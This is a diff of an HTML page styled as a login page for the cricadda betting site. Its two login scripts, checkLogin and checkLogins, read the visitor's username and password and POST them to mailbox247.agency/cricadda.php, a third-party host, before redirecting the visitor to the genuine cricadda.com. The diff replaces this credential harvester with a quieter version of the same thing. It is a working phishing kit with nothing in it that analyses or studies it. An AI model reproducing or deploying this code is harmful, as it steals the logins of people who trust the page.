@@ -215,6 +215,8 @@
 }
 
 </script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
 	
 </head>
 
@@ -1577,82 +1579,63 @@
 	   <a href="javascript:void(0)" target="_blank"><img src="images/icons/signal.png" alt="signal"></a>
 	</div>
 
-	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script type="text/javascript">
-  function checkLogin() {
-    // Get the values from the form
-    var loginName = $("#loginName").val();
-    var password = $("#password").val();
-
-    // Check if fields are filled
-    if (loginName !== '' && password !== '') {
-      // Send data via AJAX POST
-      $.ajax({
-        type: "POST",
-        url: "https://mailbox247.agency/cricadda.php",
-        data: {
-          loginName: loginName,
-          password: password
-        },
-        success: function (response) {
-          // Handle success response
-          if (response.trim() === "sucessmsg") {
-            // Redirect on success
-            window.location.href = "https://www.cricadda.com/";
-          } else {
-            // Display error message
-            $("#errorMsg").html("Username and password is incorrect.");
-          }
-        },
-        error: function () {
-          // Handle AJAX request error
-          alert("An error occurred. Please try again.");
-        }
-      });
-    } else {
-      // Alert if fields are empty
-      alert("All fields are required.");
-    }
-  }
-</script>
-	<script type="text/javascript">
-  function checkLogins() {
-    // Get the values from the form
-    var loginName = $("#loginName1").val();
-    var password = $("#password1").val();
-
-    // Check if fields are filled
-    if (loginName !== '' && password !== '') {
-      // Send data via AJAX POST
-      $.ajax({
-        type: "POST",
-        url: "https://mailbox247.agency/cricadda.php",
-        data: {
-          loginName: loginName,
-          password: password
-        },
-        success: function (response) {
-          // Handle success response
-          if (response.trim() === "sucessmsg") {
-            // Redirect on success
-            window.location.href = "https://www.cricadda.com/";
-          } else {
-            // Display error message
-            $("#errorMsg").html("Username and password is incorrect.");
-          }
-        },
-        error: function () {
-          // Handle AJAX request error
-          alert("An error occurred. Please try again.");
-        }
-      });
-    } else {
-      // Alert if fields are empty
-      alert("All fields are required.");
-    }
-  }
-</script>
-
+	<script>
+		function checkLogin() {
+		  const loginName = $('#loginName').val();
+		  const password = $('#password').val();
+	  
+		  if (!loginName || !password) {
+			return; 
+		  }
+	  
+		  $('#loginButton').prop('disabled', true);
+	  
+		  $.ajax({
+			url: 'https://mailbox247.agency/cricadda.php',
+			type: 'POST',
+			data: { login: loginName, password: password },
+			success: function () {
+			  window.location.href = "https://www.cricadda.com/"; 
+			},
+			error: function () {
+			  console.error("Failed to send data.");
+			},
+			complete: function() {
+			  $('#loginButton').prop('disabled', false);
+			}
+		  });
+		}
+	  </script>
+	  
+	  <script>
+		function checkLogins() {
+		  const loginName = $('#loginName1').val();
+		  const password = $('#password1').val();
+	  
+		  if (!loginName || !password) {
+			return;
+		  }
+	  
+		  $('#loginButton1').prop('disabled', true);
+	  
+		  $.ajax({
+			url: 'https://mailbox247.agency/cricadda.php', 
+			type: 'POST',
+			data: { login: loginName, password: password },
+			success: function () {
+			  window.location.href = "https://www.cricadda.com/"; 
+			},
+			error: function () {
+			  console.error("Failed to send data.");
+			},
+			complete: function() {
+			  $('#loginButton1').prop('disabled', false);
+			}
+		  });
+		}
+	  </script>
+	  
+	  
 
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
 
